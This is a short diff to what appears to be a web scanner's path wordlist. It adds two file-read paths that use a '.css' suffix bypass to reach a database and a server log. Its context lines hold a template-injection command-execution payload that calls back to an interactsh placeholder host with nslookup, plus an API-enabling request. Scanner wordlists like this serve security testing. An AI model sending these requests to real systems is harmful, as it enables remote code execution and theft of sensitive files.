@@ -97,3 +97,5 @@
 /access/set?param=enableapi&value=1
 /?n=%0A&cmd=nslookup+{{interactsh-url}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}
 /OS/startup/restore/restoreAdmin.php
+/tmp/temp.db%3f.1.1.1.1a-1.css
+/mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css
